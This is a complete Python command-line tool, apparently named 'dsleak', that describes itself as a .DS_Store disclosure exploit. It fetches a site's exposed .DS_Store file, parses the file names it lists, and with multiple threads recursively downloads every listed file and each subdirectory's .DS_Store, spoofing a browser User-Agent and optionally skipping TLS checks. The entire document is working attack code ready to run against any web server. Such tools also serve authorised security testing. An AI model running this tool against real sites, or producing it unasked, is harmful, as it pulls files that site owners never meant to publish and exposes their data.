#!/usr/bin/env python3
"""dsleak - .DS_Store file disclosure exploit.

Downloads a leaked .DS_Store file, parses the file names it lists, then
recursively downloads every listed file and every sub-directory .DS_Store.
"""
import argparse
import os
import re
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from io import BytesIO

from ds_store import DSStore

__version__ = "1.0.0"

DS_STORE = ".DS_Store"
MAGIC = b"\x00\x00\x00\x01Bud1"
DEFAULT_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36"
# Path separators and characters that are illegal in Windows file names.
UNSAFE_CHARS = re.compile(r'[\\/<>:"|?*\x00-\x1f]')
FILE_EXT = re.compile(r"\.[A-Za-z0-9]{1,5}$")


class NoRedirect(urllib.request.HTTPRedirectHandler):
    """Never follow redirects: they lead to login pages, not leaked files."""

    def redirect_request(self, *args, **kwargs):
        return None


def normalize_url(url):
    """Add a scheme and the /.DS_Store suffix when they are missing."""
    if "://" not in url:
        url = "http://" + url
    if not url.endswith("/" + DS_STORE):
        url = url.rstrip("/") + "/" + DS_STORE
    return url


def is_safe_name(name):
    """A .DS_Store entry must be a single, plain path component."""
    return (
        bool(name)
        and name not in (".", "..")
        and not any(c in name for c in "/\\\x00")
    )


def local_path(root, url):
    """Map a URL to root/<host>/<path>, refusing anything outside root."""
    parts = urllib.parse.urlsplit(url)
    segments = [parts.netloc] + [urllib.parse.unquote(s) for s in parts.path.split("/") if s]
    segments = [UNSAFE_CHARS.sub("_", s) for s in segments]
    root = os.path.abspath(root)
    path = os.path.abspath(os.path.join(root, *segments))
    if ".." in segments or os.path.commonpath([root, path]) != root or path == root:
        raise ValueError("unsafe local path for %s" % url)
    return path


def parse_entries(data):
    """Return the set of file names recorded in a .DS_Store blob."""
    with DSStore.open(BytesIO(data), "r") as store:
        return {entry.filename for entry in store}


def log(msg):
    print(msg, file=sys.stderr, flush=True)


class Scanner:
    def __init__(self, output=".", threads=10, timeout=10.0, insecure=False,
                 user_agent=DEFAULT_UA, verbose=False):
        ctx = ssl.create_default_context()
        if insecure:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        self.opener = urllib.request.build_opener(NoRedirect, urllib.request.HTTPSHandler(context=ctx))
        self.opener.addheaders = [("User-Agent", user_agent)]
        self.output = output
        self.threads = threads
        self.timeout = timeout
        self.verbose = verbose

    def fetch(self, url):
        try:
            with self.opener.open(url, timeout=self.timeout) as resp:
                return resp.status, resp.read()
        except urllib.error.HTTPError as e:
            with e:
                return e.code, b""

    def process(self, url):
        """Download one URL. Returns (saved, child_urls)."""
        try:
            status, body = self.fetch(url)
        except (urllib.error.URLError, OSError, ValueError) as e:
            log("[ERROR] %s: %s" % (url, getattr(e, "reason", e)))
            return False, []
        if status != 200:
            if self.verbose:
                log("[%d] %s" % (status, url))
            return False, []

        is_ds_store = url.endswith("/" + DS_STORE)
        if is_ds_store and not body.startswith(MAGIC):
            log("[WARN] %s is not a valid .DS_Store (soft 404?)" % url)
            return False, []

        try:
            path = local_path(self.output, url)
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "wb") as f:
                f.write(body)
        except (OSError, ValueError) as e:
            log("[ERROR] cannot save %s: %s" % (url, e))
            return False, []
        print("[200] %s" % url, flush=True)

        if not is_ds_store:
            return True, []
        try:
            names = parse_entries(body)
        except Exception as e:  # malformed file from an untrusted server
            log("[ERROR] cannot parse %s: %s" % (url, e))
            return True, []

        base = url[: -len(DS_STORE)]
        children = []
        for name in sorted(names):
            if not is_safe_name(name):
                log("[WARN] skipped unsafe entry %r in %s" % (name, url))
                continue
            child = base + urllib.parse.quote(name)
            children.append(child)
            # ponytail: extension heuristic, a dir named "v1.2" is never probed
            if not FILE_EXT.search(name):
                children.append(child + "/" + DS_STORE)
        return True, children

    def run(self, start_url):
        """Breadth-first crawl starting at start_url. Returns files saved."""
        seen, saved = set(), 0
        level = [normalize_url(start_url)]
        with ThreadPoolExecutor(self.threads) as pool:
            while level:
                seen.update(level)
                found = []
                for ok, children in pool.map(self.process, level):
                    saved += ok
                    found.extend(c for c in children if c not in seen)
                level = list(dict.fromkeys(found))
        return saved


def main(argv=None):
    parser = argparse.ArgumentParser(
        prog="dsleak",
        description="A .DS_Store file disclosure exploit. Parses .DS_Store files "
                    "and downloads the listed files recursively.",
        epilog="example: dsleak https://www.example.com/.DS_Store",
    )
    parser.add_argument("url", help="target .DS_Store URL (or the directory URL that contains it)")
    parser.add_argument("-o", "--output", default=".", help="output directory (default: current directory)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="concurrent requests (default: 10)")
    parser.add_argument("--timeout", type=float, default=10.0, help="request timeout in seconds (default: 10)")
    parser.add_argument("-k", "--insecure", action="store_true", help="skip TLS certificate verification")
    parser.add_argument("-A", "--user-agent", default=DEFAULT_UA, help="User-Agent header")
    parser.add_argument("-v", "--verbose", action="store_true", help="also report non-200 responses")
    parser.add_argument("-V", "--version", action="version", version="%(prog)s " + __version__)
    args = parser.parse_args(argv)
    if args.threads < 1:
        parser.error("--threads must be >= 1")

    scanner = Scanner(args.output, args.threads, args.timeout, args.insecure, args.user_agent, args.verbose)
    try:
        saved = scanner.run(args.url)
    except KeyboardInterrupt:
        log("[!] Interrupted")
        return 130
    log("[*] Done. %d file(s) saved under %s" % (saved, os.path.abspath(args.output)))
    return 0 if saved else 1


if __name__ == "__main__":
    sys.exit(main())
